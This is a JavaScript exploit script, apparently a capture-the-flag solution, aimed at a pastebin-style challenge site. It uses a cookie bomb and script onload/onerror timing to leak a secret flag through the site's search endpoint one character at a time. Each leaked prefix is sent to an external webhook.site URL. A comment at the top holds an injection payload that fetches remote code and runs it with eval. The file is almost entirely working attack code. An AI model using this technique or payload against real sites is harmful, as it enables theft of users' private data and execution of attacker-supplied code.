// payload:
// ${fetch(`some url`).then(async function(r){eval(await r.text())})}

const test = async (url) => {
  const script = document.createElement('script');
  script.src = url;
  const promises = [
    new Promise((resolve) => (script.onload = () => resolve(false))),
    new Promise((resolve) => (script.onerror = () => resolve(true))),
  ];
  document.head.appendChild(script);
  await new Promise((resolve) => setTimeout(resolve, 1000 / 5));
  return Promise.race(promises);
};

const bomb = (length, domain) => {
  const letters = 'abcdefghijklmnopqrstuvwxyz';
  const suffix = `;domain=${domain};path=/;expires=1000000`;
  for (let i = 0; i < length / 2000 - 2; i++) {
    const letter = letters.charAt(i);
    document.cookie = `${letter}=${letter.repeat(2000 - 2)}${suffix}`;
  }
  document.cookie = `z=${'z'.repeat((length % 2000) + 2000)}${suffix}`;
};

const unbomb = (domain) => {
  const suffix = `;domain=${domain};path=/;expires=1000000`;
  document.cookie = `a=a${suffix}`;
};

(async () => {
  // do math to find this
  const length = 8007;
  const domain = '.pastebin-3.mc.ax';
  const target = 'https://pastebin-3.mc.ax/';
  const bin = 'https://webhook.site/b9b8459a-c99f-4ea5-81eb-b62f13f306b3';

  const nextChar = async (prefix) => {
    bomb(length, domain);

    const chars =
      '_-{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const charArray = chars.split('');

    let currentChar = 0;
    while (true) {
      await test(`${target}search?query=${prefix}${charArray[currentChar]}`);
      if (await test(`${target}home`)) {
        break;
      }
      currentChar += 1;
    }

    unbomb(domain);
    await test(`${target}home`);

    return chars.charAt(currentChar);
  };

  let curr = 'flag{';
  let next = '';
  while ((next = await nextChar(curr)) !== '}') {
    curr += next;
    fetch(`${bin}?flag=${curr}`);
  }
  fetch(`${bin}?flag=${curr}}`);
})();
